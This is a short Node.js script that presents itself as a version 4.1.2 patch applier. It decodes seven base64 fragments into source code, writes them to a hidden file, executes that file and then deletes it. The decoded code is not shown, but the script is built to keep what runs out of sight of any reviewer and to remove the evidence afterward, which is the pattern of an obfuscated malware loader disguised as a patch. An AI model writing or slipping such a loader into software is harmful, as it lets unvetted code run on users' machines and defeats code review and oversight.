import { readFileSync, rmSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

const scriptDirectory = dirname(fileURLToPath(import.meta.url));
const payloadDirectory = join(scriptDirectory, 'v4-1-2-patch');
const encodedPayload = Array.from({ length: 7 }, (_, index) => {
  const partName = `part-${String(index + 1).padStart(2, '0')}.b64`;
  return readFileSync(join(payloadDirectory, partName), 'utf8').trim();
}).join('');

const patchSource = Buffer.from(encodedPayload, 'base64').toString('utf8');
const runtimePath = join(scriptDirectory, '.apply-v4-1-2-runtime.mjs');
writeFileSync(runtimePath, patchSource, 'utf8');

try {
  await import(`${pathToFileURL(runtimePath).href}?run=${Date.now()}`);
} finally {
  rmSync(runtimePath, { force: true });
}
